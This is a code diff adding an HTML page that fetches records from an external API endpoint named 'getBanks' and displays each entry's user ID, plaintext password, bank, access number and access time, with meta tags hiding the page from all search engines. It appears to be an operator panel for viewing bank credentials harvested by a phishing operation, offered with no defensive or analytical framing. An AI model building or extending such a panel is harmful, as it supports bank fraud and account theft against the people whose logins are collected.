@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Display</title>
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin: 10px auto;
+            max-width: 400px;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        .card h3 {
+            margin: 0 0 10px;
+        }
+
+        .card p {
+            margin: 5px 0;
+            color: #555;
+        }
+    </style>
+</head>
+
+<body>
+    <a href="index.html">Back Home</a>
+    <h1>Account Information</h1>
+    <div id="card-container"></div>
+
+    <script>
+        // Function to convert timestamp to human-readable format
+        function formatTimestamp(timestamp) {
+            const date = new Date(timestamp.replace(/-/g, '/'));
+            return date.toLocaleString('en-US', {
+                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
+            });
+        }
+
+        // Fetch data from info.json
+        fetch('https://apiserver.ct.ws/api/req/getBanks')
+            .then(response => response.json())
+            .then(data => {
+                const container = document.getElementById('card-container');
+                data.forEach(item => {
+                    const card = document.createElement('div');
+                    card.className = 'card';
+                    card.innerHTML = `
+                    <h3>Access Number: ${item.accessNumber}</h3>
+                    <p><strong>User ID:</strong> ${item.userId}</p>
+                    <p><strong>Password:</strong> ${item.password}</p>
+                    <p><strong>Bank:</strong> ${item.bank.replace(/_/g, ' ')}</p>
+                    <p><strong>Access Time:</strong> ${formatTimestamp(item.timestamp)}</p>
+                `;
+                    container.appendChild(card);
+                });
+            })
+            .catch(error => console.error('Error fetching JSON:', error));
+    </script>
+
+</body>
+
+</html>
